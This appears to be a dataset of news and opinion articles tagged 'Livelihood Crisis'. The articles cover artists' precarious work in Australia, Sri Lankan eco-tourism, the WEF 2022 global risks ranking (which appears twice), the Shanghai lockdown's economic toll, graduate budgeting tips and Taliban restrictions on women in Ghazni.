These pressures arise from both the limited opportunities and intense competition within the arts and culture sector, which make many people feel they have to accept any opportunity – and work under any conditions – in order not to be left behind.

In my research, I found all of these issues became compounded when measures of diversity were considered.

Gender inequity presents one barrier to career sustainability. Interviewees also told me First Nations artists, deaf and disabled artists, regional and remote artists, and artists from lower socio-economic backgrounds face even greater challenges. Recent research by the Australia Council for the Arts reveals the same is true for culturally and linguistically diverse artists.

Financial constraints

In the interviews taken as part of my research, I repeatedly found financial constraints underpin three problems causing career unsustainability in the arts.

1. Low incomes:

being brutal about it […] I have as good a freelance load as anyone probably going around Australia […] and my wife needs to be working full-time for us to be financially sustainable.

2. Unpaid work:

you really only get paid if you’re performing and if you’re lucky enough, you might get paid for the rehearsals beforehand

3. Excessive workloads:

the level of burnout in this industry is pretty shocking […] we’re all overworked and constantly tired.

The obvious solution is more abundant and ongoing public and philanthropic support. As one interviewee explained:

Increased government funding for the arts is […] the first and most important step in the career sustainability of artists because it flows through everything else.

But other creative solutions are also needed to make artistic careers more sustainable. These include: increasing diversity within arts sector leadership; teaching student artists to develop an “adaptive entrepreneurial identity”; and fostering community and collective support among artists and arts managers.

Moving towards ‘decent work’ for all

The United Nations’ Sustainable Development Goal 8 calls for “full and productive employment and decent work for all.”

In 2019, the International Labour Organization began exploring what “decent work” means for arts and culture. Australian politicians, policymakers, and sector leaders need to do the same.

These three steps will help.

1. Recognise artists are workers.

This would mean paying serious attention to the conditions of contemporary artistic labour, which would pave the way to addressing both precarity and structural inequalities within the arts and culture sector.

2. Accept decent work is a human right.

This would mean acknowledging artists and arts managers (like all people) are entitled to gain a living from their work, then developing policies to prioritise the creation of good jobs within the arts and culture sector.

3. Implement decent work for artists.

For artists, this means rejecting any expectation creatives might “work for exposure.” For arts companies, it means putting artists on payroll, embedding fair pay and conditions within all arts organisations, and supporting cultural change across the sector.",Livelihood Crisis,2021-12-05 08:00:00

* UNDP in Sri Lanka conducts Eco-Tourism Awareness Programme for tour guides and tour operators in Dambulla

Wed, Jun 8, 2022, 07:36 pm SL Time, ColomboPage News Desk, Sri Lanka.

Leveraging natural resources for Biodiversity Financing through Eco-Tourism initiatives

June 08, Colombo: As one of the World’s 36 biodiversity hotspots, Sri Lanka has the highest biodiversity per unit area of land among all Asian countries.

Protecting the unique and diverse ecosystems is vital in the fight against accelerating climate change and as an indicator of the health and resilience of the environment.

Along with protecting Sri Lanka’s biodiversity, we must look at the economic aspects of biodiversity conservation and livelihood management. To ensure the sustainability of managing biodiverse locations such as national parks, arboretums, bird parks and wetlands, it is necessary to explore innovative methods of raising financing.

Tourism is an effective method of leveraging and mobilizing available natural resources for biodiversity financing. Accordingly, the United Nations Development Programme (UNDP) in Sri Lanka supported the Biodiversity Secretariat of the Ministry of Environment (MoE) in Sri Lanka to conduct an awareness program for tour guides and tour operators to promote eco-tourism in Dambulla at the NIFS-Popham Arboretum.

This program was conducted recently as a part of the “Environment Week” declared by the MoE to celebrate World Environment Day on 5 June. As such, 2 June was named Biodiversity Day, and the awareness program was conducted in honor of this.

Given the ongoing economic crisis in Sri Lanka, reliance only on state funding for conservation and protection is simply not sustainable. Accordingly, exploring methods of achieving financial sustainability for biodiversity conservation is vital. The sustainable use of natural resources and biodiversity for livelihood and income generation is one such method of ensuring conservation whilst empowering communities in the surrounding areas.

An arboretum is a botanical collection composed of a wide variety of species and trees. The NIFS-Popham Arboretum is situated 2.5 km away from Dambulla and was gifted to the National Institute of Fundamental Studies (NIFS) in 1989 to carry out research and educational activities. This arboretum hosts many local and foreign researchers for ecological research purposes and is a popular tourist destination due to its unique biodiversity. The arboretum has rich vegetation of over 200 plant species and a variety of unique fauna to be found, and it acts as a restoration site for valuable and endangered indigenous forest species.

There is significant potential for the arboretum to be further developed as an eco-tourism destination as it hosts many activities such as day and night safaris, camping, and offers other lodging and research facilities. The MoE has planned to develop this arboretum into a profitable and sustainable eco-tourism venture, whilst ensuring the maintenance of its unique and precious ecology.

Speaking at the workshop, Dr. R. D. S. Jayathunga from the Ministry of Environment stated, “Biodiversity in Sri Lanka has faced many challenges. Eco-tourism has been identified as a major area to promote the conservation of biodiversity… It contributes to community development.”

UNDP in Sri Lanka and the European Union (EU) have come together to support the revitalization of Sri Lanka’s Tourism Industry together with the Ministry of Tourism. With the overall support provided through the ‘Transforming Tourism in Sri Lanka: Emerging from crisis as a strong, resurgent and rebranded industry’ project, this awareness programme was only a step in developing this arboretum as a tourist experience, and it aims to provide tour guides and operators in the area with the knowledge to promote it as a sustainable nature-based experience.

The participants were enriched with knowledge of the arboretum’s biodiversity value, the role of a tour guide in eco-tourism practices, and eco-tourism opportunities in the arboretum, with space provided for guides to share their ideas and experiences as well.

Commenting on the EU’s overall support to the Tourism Industry, Ms. Harshani Halangode from the EU stated, “with the valuable partnership with UNDP, we aim to revitalize and transform the tourism industry into a resilient, sustainable, and intrinsic sector. We are pleased to help upscale tour guides and tour operators in the area, supporting livelihoods, providing skills development for youth, and supporting rural communities”.

The collaboration between the EU and UNDP signifies the critical importance of tourism to Sri Lanka’s economic recovery at this critical juncture. Speaking on the partnership, Ms. Malin Herwig, Deputy Resident Representative of UNDP in Sri Lanka stated, “In close partnership with the EU, we are working to protect natural and cultural assets, so that they are protected for tourism, and other needs and sectors. With the generous support of the EU for the Transforming Tourism Project, we are building initiatives to lay the foundation for more investments in an innovative and nature-based tourism sector”.

The Transforming Tourism Project aims to address the urgent needs of the industry, strengthening the institutional framework and capacity to set it on a trajectory for a greener, more resilient future with a focus on such initiatives targeted at biodiversity conservation through the sustainable use of natural resources for livelihood and income generation.",Livelihood Crisis,2022-06-08 14:06:00

These risks, and the health of the planet, are seen as some of the most imminent threats to the world.

The planet cannot wait: failure to take climate action, extreme weather and loss of biodiversity are also risks that rank among the most potentially severe in the next decade, according to the Global Risks Report 2022, an annual study published by the World Economic Forum.

The report, published January, considers 37 global risks that would have a widespread impact should they play out. Covid-19 is an example, with nearly 5.8 million deaths worldwide, widespread illness, as well as its impact on the health care system, economy, education and other aspects of society.

And risks can rapidly become crises, as we have seen in Ukraine in the past two weeks. Some of these risks — fracture of interstate relations and interstate conflict — have once again become front and center with Russia's attack on Ukraine that began Feb. 24, 2022. Such a crisis leads to the realization of other global risks: large-scale involuntary migration, state collapse, geoeconomic confrontations, debt crises, and further degradation of the environment, to name a few.

The report includes a survey of nearly 1,000 global experts and leaders who are asked to choose nine of 37 global risks and rank them from 1 to 9, according to their perceived severity of impact, where the most severe has the potential to yield the most damage on a global scale within the next 10 years.

Respondents were asked to value the impact of risks considering human suffering, societal disruption, economic shock, environmental degradation and political instability. The results were aggregated by how many times each risk was ranked either most severe, second-most severe, and so forth.

Asked to take a view of the past two years, respondents to the survey said societal risks—in the form of erosion of social cohesion, livelihood crises and deterioration of mental health as those that have worsened the most since the pandemic began.

Only 16% of respondents feel positive and optimistic about the outlook for the world, and just 11% believe the current global recovery will accelerate.

Most respondents instead expect the next three years to be characterized by either consistent volatility and multiple surprises or fractured trajectories that will separate relative winners and losers, the report says.

Here are the greatest threats to the world, ranked in order of those of greatest concern, according to the survey, along with their descriptions. They are categorized as societal, economic, environmental, technological and geopolitical.

1. Erosion of social cohesion Category: Societal Percent of respondents: 27.8% Loss of social capital and a fracture of social networks negatively impacting social stability, individual well-being and economic productivity as a result of persistent public anger, distrust, divisiveness, lack of empathy, marginalization of minorities, and political polarization. This is the risk that has worsened the most globally since the start of the Covid-19 crisis, according to the GRPS. It is perceived as a critical threat to the world across all time spans—short, medium and long term—and is seen as among the most potentially damaging for the next 10 years, the report says. 2. Employment and livelihood crises Category: Societal Percent of respondents: 25.5% Structural deterioration of work prospects and/or standards for the working-age population: unemployment, underemployment, lower wages, fragile contracts, erosion of worker rights, etc. This is seen as the most immediate national threat in 97 countries, including 16 of the G20 economies. Millions of people are already seeking to cross borders in search of better economic opportunities, creating a wave of economic migrants. 3. Climate action failure Category: Environmental Percent of respondents: 25.4% Failure of governments and businesses to enforce, enact or invest in effective climate change adaptation and mitigation measures, preserve ecosystems, protect populations and transition to a carbon-neutral economy. A disorderly climate transition will exacerbate inequalities. Climate change is already manifesting rapidly in the form of droughts, fires, floods, resource scarcity and species loss, among other impacts. Failure to act will further divide countries and societies, creating barriers to cooperation. Above, demonstrators wear masks of world leaders during march in Glasgow, U.K, during the UN COP26 climate conference in November 2021. 4. Mental health deterioration Category: Societal Percent of respondents: 23% Pervasiveness of mental health ailments and/or disorders globally and across multiple demographics, negatively impacting well-being, social cohesion and productivity: anxiety, dementia, depression, loneliness, stress. This was exacerbated by Covid-19. 5. Extreme weather Category: Environmental Percent of respondents: 22.7% Loss of human life, damage to ecosystems, destruction of property and/or financial loss at a global scale that comes as a result of extreme weather events: cold fronts, fires, floods, heat waves, windstorms and others. The countries ranking these risks highly are particularly prone to wildfires, droughts, floods, deforestation and pollution. Worsening extreme weather will trigger large-scale migration and displacement, the report says, and that more frequent and extreme weather events— including fires, floods and droughts—could displace more than 200 million people by 2050. >>Also see: 30 Ways the World Is Taking Bold Climate Action 6. Debt crises Category: Economic Percent of respondents: 13.8% Corporate and/or public finances overwhelmed by debt accumulation and/or debt servicing in large economies, resulting in mass bankruptcies, defaults, insolvency, liquidity crises or sovereign debt crises. Sovereign debt has spiked because of the pandemic—government debt globally increased by 13% in 2020. 7. Failure of cybersecurity measures Category: Technological Percent of respondents: 12.4% Business, government and household cybersecurity infrastructure and/or measures are outstripped or rendered obsolete by increasingly sophisticated and frequent cyber crimes, resulting in economic disruption, financial loss, geopolitical tensions and/or social instability. 8. Infectious diseases Category: Societal Percent of respondents: 10.9% Massive and rapid spread of viruses, parasites, fungi or bacteria that cause an uncontrolled contagion of infectious diseases, resulting in an epidemic or pandemic with loss of life and economic disruption. 9. Digital inequality Category: Technological Percent of respondents: 10.5% Fractured and/or unequal access to critical digital networks and technology, between and within countries, as a result of unequal investment capabilities, lack of necessary skills in the workforce, insufficient purchase power, government restrictions and/or cultural differences. 10. Pervasive backlash against science Category: Societal Percent of respondents: 9.5% Censure, denial and/or skepticism towards scientific evidence and the scientific community at a global scale can result in a regression or stalling of progress on climate action, human health and/or technological innovation. 11. Biodiversity loss and ecosystem collapse Category: Environmental Percent of respondents: 8.4% This has irreversible consequences for the environment, humankind, and economic activity, and leads to a permanent destruction of natural capital, as a result of species extinction and/ or reduction. 12. Geo-economic confrontations Category: Geopolitical Percent of respondents: 8.2% Deployment of economic levers, including investment controls, trade controls, non-tariff barriers and/or currency measures, by global or regional powers to decouple economic interactions between nations and consolidate spheres of influence. 13. Human-made environmental damage Category: Environmental Percent of respondents: 7.8% Loss of human life, financial loss and/or damage to ecosystems as a result of human activity and/or failure to co-exist with animal ecosystems. It is a result of things like deregulation of protected areas, industrial accidents, oil spills, radioactive contamination and wildlife trade. 14. Widespread youth disillusionment Category: Societal Percent of respondents: 7.1% Youth disengagement, lack of confidence and loss of trust of economic, political and social structures at a global scale negatively impacts social stability, individual well-being and economic productivity. 15. Fracture of interstate relations Category: Geopolitical Percent of respondents: 7% Economic, political and/or technological rivalries between geopolitical powers result in a fracture of bilateral relations and growing tensions. Relations between Ukraine and Russia have degraded to a crisis since the Global Risks report was published and Russian forces invaded Ukraine Feb. 24, 2022. The report states that a rise in political instability, state fragility and civil conflict are likely to further swell refugee numbers. Since the invasion, as many as 1.5 million refugees have fled Ukraine to neighboring countries, according to U.N. estimates. 16. Prolonged economic stagnation Category: Economic Percent of respondents: 6.9% Near-zero or slow global growth lasting for many years. 17. Asset bubble bursts in large economies Shutterstock Category: Economic Percent of respondents: 6.7% Prices for housing, investment funds, shares and other assets in a large economy increasingly disconnect from the real economy. 18. Collapse or lack of social security systems Category: Societal Percent of respondents: 6.2% Non-existence or widespread bankruptcy of social security systems or erosion of social security benefits such as disability, elderly, family, injury, maternity, medical care, sickness, survivor, unemployment or other similar benefits. Above, pensioners crowd outside a national bank branch in Greece, when the country cut state pensions during the financial crisis in 2015. 19. Large-scale involuntary migration Category: Societal Percent of respondents: 5.4% Large-scale involuntary migration can be induced by climate change, discrimination, lack of economic advancement opportunities, persecution, natural or human-made disasters, or violent conflict. Above, Ukrainians crowd a train station in Lyiv, Ukraine, March 7, 2022, to catch a train out of the country. Since the Russian attack on Ukraine Feb. 24, as many as 1.5 million have fled the country to neighboring Poland, Hungary, Slovakia, Romania and other E.U. countries, according to U.N. estimates. 20. Adverse outcomes of technological advances Category: Technological Percent of respondents: 5.3% There can be intended or unintended negative consequences of technological advances on individuals, businesses, ecosystems and/or economies from artificial intelligence, brain-computer interfaces, biotechnology, geo-engineering or quantum computing. 21. Failure of technology governance Category: Technological Percent of respondents: 4.5% When different countries adopt incompatible digital infrastructure, protocols and standards, it leads to a lack of globally accepted frameworks, institutions or regulations for the use of critical digital networks and technology. 22. Geopolitical contestation of strategic resources Category: Geopolitical Percent of respondents: 4.4% Concentration, exploitation and mobility restriction by a state of goods, knowledge, services or technology that are critical to human development with the intent of gaining geopolitical advantage. Conflicts over water resources are an example. According to BBC Future, conflicts over water are increasing, and drought could put up to 700 million people at risk of displacement by 2030. Above, a woman collects water in the parched wetlands of southern Iraq, where reduced river flows due to damming upstream in Turkey have led to worsening water quality in the region. 23.

These risks, and the health of the planet, are seen as some of the most imminent threats to the world.

The planet cannot wait: failure to take climate action, extreme weather and loss of biodiversity are also risks that rank among the most potentially severe in the next decade, according to the Global Risks Report 2022, an annual study published by the World Economic Forum.

The report, published January, considers 37 global risks that would have a widespread impact should they play out. Covid-19 is an example, with nearly 5.8 million deaths worldwide, widespread illness, as well as its impact on the health care system, economy, education and other aspects of society.

And risks can rapidly become crises, as we have seen in Ukraine in the past two weeks. Some of these risks — fracture of interstate relations and interstate conflict — have once again become front and center with Russia's attack on Ukraine that began Feb. 24, 2022. Such a crisis leads to the realization of other global risks: large-scale involuntary migration, state collapse, geoeconomic confrontations, debt crises, and further degradation of the environment, to name a few.

The report includes a survey of nearly 1,000 global experts and leaders who are asked to choose nine of 37 global risks and rank them from 1 to 9, according to their perceived severity of impact, where the most severe has the potential to yield the most damage on a global scale within the next 10 years.

Respondents were asked to value the impact of risks considering human suffering, societal disruption, economic shock, environmental degradation and political instability. The results were aggregated by how many times each risk was ranked either most severe, second-most severe, and so forth.

Asked to take a view of the past two years, respondents to the survey said societal risks—in the form of erosion of social cohesion, livelihood crises and deterioration of mental health as those that have worsened the most since the pandemic began.

Only 16% of respondents feel positive and optimistic about the outlook for the world, and just 11% believe the current global recovery will accelerate.

Most respondents instead expect the next three years to be characterized by either consistent volatility and multiple surprises or fractured trajectories that will separate relative winners and losers, the report says.

Here are the greatest threats to the world, ranked in order of those of greatest concern, according to the survey, along with their descriptions. They are categorized as societal, economic, environmental, technological and geopolitical.

1. Erosion of social cohesion Category: Societal Percent of respondents: 27.8% Loss of social capital and a fracture of social networks negatively impacting social stability, individual well-being and economic productivity as a result of persistent public anger, distrust, divisiveness, lack of empathy, marginalization of minorities, and political polarization. This is the risk that has worsened the most globally since the start of the Covid-19 crisis, according to the GRPS. It is perceived as a critical threat to the world across all time spans—short, medium and long term—and is seen as among the most potentially damaging for the next 10 years, the report says. 2. Employment and livelihood crises Category: Societal Percent of respondents: 25.5% Structural deterioration of work prospects and/or standards for the working-age population: unemployment, underemployment, lower wages, fragile contracts, erosion of worker rights, etc. This is seen as the most immediate national threat in 97 countries, including 16 of the G20 economies. Millions of people are already seeking to cross borders in search of better economic opportunities, creating a wave of economic migrants. 3. Climate action failure Category: Environmental Percent of respondents: 25.4% Failure of governments and businesses to enforce, enact or invest in effective climate change adaptation and mitigation measures, preserve ecosystems, protect populations and transition to a carbon-neutral economy. A disorderly climate transition will exacerbate inequalities. Climate change is already manifesting rapidly in the form of droughts, fires, floods, resource scarcity and species loss, among other impacts. Failure to act will further divide countries and societies, creating barriers to cooperation. Above, demonstrators wear masks of world leaders during march in Glasgow, U.K, during the UN COP26 climate conference in November 2021. 4. Mental health deterioration Category: Societal Percent of respondents: 23% Pervasiveness of mental health ailments and/or disorders globally and across multiple demographics, negatively impacting well-being, social cohesion and productivity: anxiety, dementia, depression, loneliness, stress. This was exacerbated by Covid-19. 5. Extreme weather Category: Environmental Percent of respondents: 22.7% Loss of human life, damage to ecosystems, destruction of property and/or financial loss at a global scale that comes as a result of extreme weather events: cold fronts, fires, floods, heat waves, windstorms and others. The countries ranking these risks highly are particularly prone to wildfires, droughts, floods, deforestation and pollution. Worsening extreme weather will trigger large-scale migration and displacement, the report says, and that more frequent and extreme weather events— including fires, floods and droughts—could displace more than 200 million people by 2050. >>Also see: 30 Ways the World Is Taking Bold Climate Action 6. Debt crises Category: Economic Percent of respondents: 13.8% Corporate and/or public finances overwhelmed by debt accumulation and/or debt servicing in large economies, resulting in mass bankruptcies, defaults, insolvency, liquidity crises or sovereign debt crises. Sovereign debt has spiked because of the pandemic—government debt globally increased by 13% in 2020. 7. Failure of cybersecurity measures Category: Technological Percent of respondents: 12.4% Business, government and household cybersecurity infrastructure and/or measures are outstripped or rendered obsolete by increasingly sophisticated and frequent cyber crimes, resulting in economic disruption, financial loss, geopolitical tensions and/or social instability. 8. Infectious diseases Category: Societal Percent of respondents: 10.9% Massive and rapid spread of viruses, parasites, fungi or bacteria that cause an uncontrolled contagion of infectious diseases, resulting in an epidemic or pandemic with loss of life and economic disruption. 9. Digital inequality Category: Technological Percent of respondents: 10.5% Fractured and/or unequal access to critical digital networks and technology, between and within countries, as a result of unequal investment capabilities, lack of necessary skills in the workforce, insufficient purchase power, government restrictions and/or cultural differences. 10. Pervasive backlash against science Category: Societal Percent of respondents: 9.5% Censure, denial and/or skepticism towards scientific evidence and the scientific community at a global scale can result in a regression or stalling of progress on climate action, human health and/or technological innovation. 11. Biodiversity loss and ecosystem collapse Category: Environmental Percent of respondents: 8.4% This has irreversible consequences for the environment, humankind, and economic activity, and leads to a permanent destruction of natural capital, as a result of species extinction and/ or reduction. 12. Geo-economic confrontations Category: Geopolitical Percent of respondents: 8.2% Deployment of economic levers, including investment controls, trade controls, non-tariff barriers and/or currency measures, by global or regional powers to decouple economic interactions between nations and consolidate spheres of influence. 13. Human-made environmental damage Category: Environmental Percent of respondents: 7.8% Loss of human life, financial loss and/or damage to ecosystems as a result of human activity and/or failure to co-exist with animal ecosystems. It is a result of things like deregulation of protected areas, industrial accidents, oil spills, radioactive contamination and wildlife trade. 14. Widespread youth disillusionment Category: Societal Percent of respondents: 7.1% Youth disengagement, lack of confidence and loss of trust of economic, political and social structures at a global scale negatively impacts social stability, individual well-being and economic productivity. 15. Fracture of interstate relations Category: Geopolitical Percent of respondents: 7% Economic, political and/or technological rivalries between geopolitical powers result in a fracture of bilateral relations and growing tensions. Relations between Ukraine and Russia have degraded to a crisis since the Global Risks report was published and Russian forces invaded Ukraine Feb. 24, 2022. The report states that a rise in political instability, state fragility and civil conflict are likely to further swell refugee numbers. Since the invasion, as many as 1.5 million refugees have fled Ukraine to neighboring countries, according to U.N. estimates. 16. Prolonged economic stagnation Category: Economic Percent of respondents: 6.9% Near-zero or slow global growth lasting for many years. 17. Asset bubble bursts in large economies Shutterstock Category: Economic Percent of respondents: 6.7% Prices for housing, investment funds, shares and other assets in a large economy increasingly disconnect from the real economy. 18. Collapse or lack of social security systems Category: Societal Percent of respondents: 6.2% Non-existence or widespread bankruptcy of social security systems or erosion of social security benefits such as disability, elderly, family, injury, maternity, medical care, sickness, survivor, unemployment or other similar benefits. Above, pensioners crowd outside a national bank branch in Greece, when the country cut state pensions during the financial crisis in 2015. 19. Large-scale involuntary migration Category: Societal Percent of respondents: 5.4% Large-scale involuntary migration can be induced by climate change, discrimination, lack of economic advancement opportunities, persecution, natural or human-made disasters, or violent conflict. Above, Ukrainians crowd a train station in Lyiv, Ukraine, March 7, 2022, to catch a train out of the country. Since the Russian attack on Ukraine Feb. 24, as many as 1.5 million have fled the country to neighboring Poland, Hungary, Slovakia, Romania and other E.U. countries, according to U.N. estimates. 20. Adverse outcomes of technological advances Category: Technological Percent of respondents: 5.3% There can be intended or unintended negative consequences of technological advances on individuals, businesses, ecosystems and/or economies from artificial intelligence, brain-computer interfaces, biotechnology, geo-engineering or quantum computing. 21. Failure of technology governance Category: Technological Percent of respondents: 4.5% When different countries adopt incompatible digital infrastructure, protocols and standards, it leads to a lack of globally accepted frameworks, institutions or regulations for the use of critical digital networks and technology. 22. Geopolitical contestation of strategic resources Category: Geopolitical Percent of respondents: 4.4% Concentration, exploitation and mobility restriction by a state of goods, knowledge, services or technology that are critical to human development with the intent of gaining geopolitical advantage. Conflicts over water resources are an example. According to BBC Future, conflicts over water are increasing, and drought could put up to 700 million people at risk of displacement by 2030. Above, a woman collects water in the parched wetlands of southern Iraq, where reduced river flows due to damming upstream in Turkey have led to worsening water quality in the region. 23. Digital power concentration Category: Technological Percent of respondents: 4.3% Concentration of critical digital assets, capabilities and knowledge by a reduced number of individuals, businesses or states can result in discretionary pricing mechanisms, lack of impartial oversight and unequal private or public access. For example, tech giants like Apple, Amazon, Alphabet, Facebook and Microsoft wield political and economic power in a variety of ways. 24.

A protracted shutdown of China’s economic powerhouse would have far-reaching economic consequences at home and further afield.","Hong Kong, China – When more than 26 million Shanghai residents were sent into lockdown last week, restaurateur Cotton Ding’s heart sank.

“We have been fighting the pandemic since 2020, and for the past two years we’ve experienced a lot of changes,” Ding, who owns two restaurants located in historic colonial villas in the heart of the former French Concession, told Al Jazeera.

“We were finally getting back on our feet, business had recovered and was doing a little better, then the recent outbreaks and lockdowns hit.”

Spring would normally be Ding’s busiest period, with guests taking advantage of her leafy patio to enjoy the balmy Shanghainese weather.

Instead, business has been “a total disaster”, she said, due to the lockdown, which authorities this week extended to cover the entire city indefinitely after a two-phase lockdown introduced on March 28 failed to bring coronavirus cases under control.

“Usually we hire and train new staff to cater for this time, upgrade our furniture settings and bring the garden to life,” she said.

“Now we have been ordered to shut our doors and we anticipate that we will be closed for most of April.”

Ding said she has no idea when she will be able to reopen or go back to full capacity.

“The worry has not allowed me to sleep well at all,” she said.

Since the start of March, authorities in China’s most populous city have reported more than 114,000 cases, far exceeding the nationwide caseload of the previous two years. On Thursday, Shanghai recorded 19,982 cases, its highest daily figure yet.

Chinese officials have described the outbreak as “extremely grim” and sent tens of thousands of healthcare workers to help contain infections in the city, including military personnel.

Nevertheless, authorities have yet to report any deaths in the city – an anomaly that has fuelled scepticism about China’s official figures.

Amid the mounting economic toll of China’s zero-tolerance approach to the virus, known as “dynamic zero COVID”, there are signs that public patience is wearing thin.

Videos circulating on social media have shown residents struggling to buy basic necessities like food and water, due to the closure of supermarkets remain and overburdening of delivery services. Other residents have posted videos complaining about overcrowding and unsanitary conditions at the city’s mass quarantine centres, including soiled shared toilets and a lack of showering facilities.

In one video posted online, a woman can be seen begging to leave her compound to get her husband cancer treatment. Residents also expressed outrage over the separation of COVID positive children from their parents, leading authorities on Wednesday to bow to public pressure and ditch the policy.

A protracted shutdown of China’s economic powerhouse would have far-reaching economic consequences at home and further afield. Shanghai is the country’s most important financial and manufacturing base, with its output accounting for 4 percent of China’s gross domestic product (GDP). The city is also home to the world’s largest port, handling about 20 percent of China’s exports overseas.

Xia Le, chief Asia economist at Banco Bilbao Vizcaya Argentaria (BBVA), told Al Jazeera that the economic impact of the lockdown would depend on its duration.

“If the lockdown only lasts for two months, say April and May, it will trim China’s growth by 0.3-0.5 percent this year,” Xia said. “If the lockdown lasts throughout the third quarter, it will cut China’s growth by 1.5-2 percent.”

Xia said China would be unable to meet its 5.5 percent official growth target if the lockdown continued beyond June “even if authorities were to deploy more pro-growth policies”.

Beijing has warned of strong headwinds facing the economy this year, including the effect of the pandemic, although it has given no indication it intends to fundamentally alter its zero-tolerance approach.

Activity in the country’s services sector contracted at the quickest pace in two years in March, according to official Chinese government data, with the non-manufacturing Purchasing Managers’ Index (PMI) falling to 48.4, from 51.6 the previous month.

A private sector survey paints an even bleaker picture. According to a report released by Caixin on Wednesday, China’s PMI fell to 42 in March from 50.2 in February, the lowest level since the beginning of the pandemic in February 2020.

“Overall, both manufacturing and services activities weakened in March due to the epidemic,” Caixin Insight Group senior economist Wang Zhe said in a statement. “Similar to previous COVID outbreaks in China, the services sector was more significantly affected than manufacturing.”

“Policymakers should look out for vulnerable groups and enhance support for key industries and small and micro businesses to stabilise market expectations,” Wang said.

As the rest of the world learns to live with the virus, China’s uniquely strict policies have also raised questions about its competitiveness in a global economy where pandemic restrictions have been mostly consigned to history.

“Chinese exporters will lose more orders to their foreign competitors in a real ‘open’ economy,” said Xia, the BBVA economist. “China is expected to have less foreign direct investment before it reopens its economy. In the meantime, international investors might become less interested in Chinese assets.”

Xia said the zero COVID strategy would not be sustainable in the long run.

“I am not saying that they should abandon this strategy immediately, but it’s time to reassess the strategy and make the change at some point,” he said. “A sensible transition plan will strike a good balance between saving lives and maintaining economic prosperity.”

Anxiety and stress

For Ding, the Shanghai restaurateur, the last few weeks have been financially crippling.

“It has totally destroyed our cash flow,” she said. “As a small business, we will not be able to pay our rent, staff and suppliers straight away. It will take years for us to pay the debts.”

Ding said she is concerned for the welfare of her 50 employees, whose livelihoods she feels responsible for.

“The uncertainty has caused them a lot of anxiety and stress,” she said. “I’m in contact with them daily and they tell me they are worried and feeling unsettled.”

Chinese authorities have offered some financial support for businesses, including 140 billion yuan ($22bn) in tax relief and a three-month rent exemption for small tenants at state-owned entities.

“It is a tiny fraction of our losses and if you are not earning anything there isn’t much tax to pay anyways,” Ding said.

“Unfortunately for me, both my locations are privately owned and I will not receive the exemption. I will try to negotiate a discount with my landlords directly but as one of them was trying to up the rent by 15 percent recently it may be a hard deal.”",Livelihood Crisis,2022-04-07 07:00:00

You've been submitting your money saving or cost of living dilemmas for personal finance expert Gemma Godfrey - and the question form is now closed while she tackles some of the hundreds that have come in, including this...

Mark T: I have just taken my first job after my graduation. I make £42k before tax. After paying my London rent and bills, I am left with very little disposable income. What can recent graduates do to minimise any cost of living impact?

Gemma says: Just because you're no longer a student, it doesn't mean you don't qualify for special deals.

Check out whether your university has an alumni programme and the cost of joining is offset by the discounts you could continue to get on your favourite brands.

If you regularly travel by train, you might also consider a 16-25 railcard for a significant discount, though some commutes might be excluded.

There's also the option of saving money (and helping the planet) by recycling clothes. There are retailers that offer rewards and discounts to people who donate unwanted clothing and footwear (some don't mind if the clothes aren't even their brand).

Budgeting apps can help to identify small but regular spending that you can cut.

Plus, it could be worth looking into cash-back, voucher sites and signing up to newsletters to get discounts on items you would have bought anyway. Plenty of stores now offer loyalty cards. However, not all loyalty points are equal, especially when it comes to the big supermarket chains. So, comparing programmes can help you decide which might be better for you before you commit.

(New York) – Taliban rule has had a devastating impact on Afghan women and girls, new research shows, Human Rights Watch and the Human Rights Institute at San Jose State University (SJSU) said today. The organizations looked at the conditions for women since the Taliban took control in Ghazni province, in southeastern Afghanistan.

Since taking control of the city of Ghazni on August 12, 2021, days before entering Afghanistan’s capital, Kabul, the Taliban have imposed rights-violating policies that have created huge barriers to women’s and girls’ health and education, curtailed freedom of movement, expression, and association, and deprived many of earned income. Afghanistan’s rapidly escalating humanitarian crisis exacerbates these abuses. Following the Taliban takeover, millions of dollars in lost income, spiking prices, aid cut-offs, a liquidity crisis, and cash shortages triggered by former donor countries, especially the United States, have deprived much of the population of access to food, water, shelter, and health care.

“Afghan women and girls are facing both the collapse of their rights and dreams and risks to their basic survival,” said Halima Kazem-Stojanovic, a core faculty member of SJSU’s Human Rights Institute and a scholar on Afghanistan. “They are caught between Taliban abuses and actions by the international community that are pushing Afghans further into desperation every day.”

Human Rights Watch and SJSU remotely interviewed 10 women currently or recently in Ghazni province, including those who had worked in education, health care, social services, and business, and former students.

They described spiraling prices for food staples, transportation, and schoolbooks, coupled with an abrupt and often total income loss. Many had been the sole or primary wage earner for their family, but most lost their employment due to Taliban policies restricting women’s access to work. Only those working in primary education or health care were still able to work, and most were not being paid due to the financial crisis.

The Taliban have banned women and girls from secondary and higher education, and altered curricula to focus more on religious studies. They dictate what women must wear, how they should travel, workplace segregation by sex, and even what kind of cell phones women should have. They enforce these rules through intimidation and inspections.

“The future looks dark,” said one woman who had worked in the government. “I had many dreams, wanted to continue studying and working. I was thinking of doing my master’s. At the moment, they [the Taliban] don’t even allow girls to finish high school.”

The women said they had acute feelings of insecurity because the Taliban have dismantled the formal police force and the Women’s Affairs Ministry, are extorting money and food from communities, and are targeting for intimidation women they see as enemies, such as those who worked for foreign organizations and the previous Afghan government. Most interviewees cited serious mental health consequences since the Taliban takeover, including fear, anxiety, hopelessness, insomnia, and a deep sense of loss and helplessness.

“The crisis for women and girls in Afghanistan is escalating with no end in sight,” said Heather Barr, associate women’s rights director at Human Rights Watch. “Taliban policies have rapidly turned many women and girls into virtual prisoners in their homes, depriving the country of one of its most precious resources, the skills and talents of the female half of the population.”

Methodology

Ghazni province, in southeastern Afghanistan, has a population of about 1.3 million people, predominantly ethnic Pashtun and Hazara. The provincial capital, Ghazni, is on the road from Kabul to Kandahar, and was often attacked during the fighting of the past 20 years.

SJSU and Human Rights Watch conducted interviews remotely, using secure communications, with women currently in Afghanistan, all of them from Ghazni province. Most were in Ghazni province; a few were in other parts of Afghanistan. Most of those in Ghazni province were living in Ghazni city but some were in other parts of the province. The interviewees had worked in education, health care, government, and nongovernmental organizations or had been higher education students. Interviews were conducted in Dari with the consent of the interviewee. Seven of those interviewed are Hazara, one Pashtun, and two members of an ethnic minority group.

The value of the Afghan currency, the afghani, has fluctuated rapidly since the Taliban takeover. It was about 120 afghanis to 1 US dollar at the time of the research, and we have used this exchange rate for conversions.

Loss of Income, Employment

Nearly all the women interviewed who previously had paid employment had lost their jobs. “In Ghazni [province], only female healthcare workers and teachers can go to work,” a nongovernmental organization worker said. “Women working in other fields are forced to stay home now.”

